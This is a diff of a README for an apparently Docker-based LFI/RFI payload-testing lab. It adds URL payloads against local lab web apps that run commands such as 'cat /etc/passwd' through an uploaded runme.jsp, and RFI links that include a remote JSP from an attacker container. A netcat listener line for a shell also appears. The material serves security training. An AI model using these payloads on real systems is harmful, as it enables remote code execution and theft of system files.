@@ -2,6 +2,10 @@
 
 For an in-detail-description of the following payloads go to [https://secf00tprint.github.io/blog/payload-tester/lfirfi/en](https://secf00tprint.github.io/blog/payload-tester/lfirfi/en)
 
+## RFI
+
+For the RFI payloads you have to change the IP to the IP from the internal network in every link. Use `docker inspect <docker_attacker_id>` to get the IP.
+
 ## PHP
 
 ### RFI 
@@ -66,9 +70,16 @@ nc 172.18.0.1 4444
 
 Upload runme.jsp for Remote Code Execution:
 
-[http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls)
-[http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd)
-[http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/introduction](http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/introduction)
+- [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls)
+- [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd)
+
+### RFI
+
+(You have to adjust ip addresses to the attacker server in the docker network)
+
+[http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor](http://localhost:8881/webapp/?help=http://172.18.0.3:8080/webapp/thiscomesfromhaxxor)
+
+[http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=http://172.18.0.3:8080/webapp/runme.jsp?exec=ls)
 
 ## ASP / Razor
 
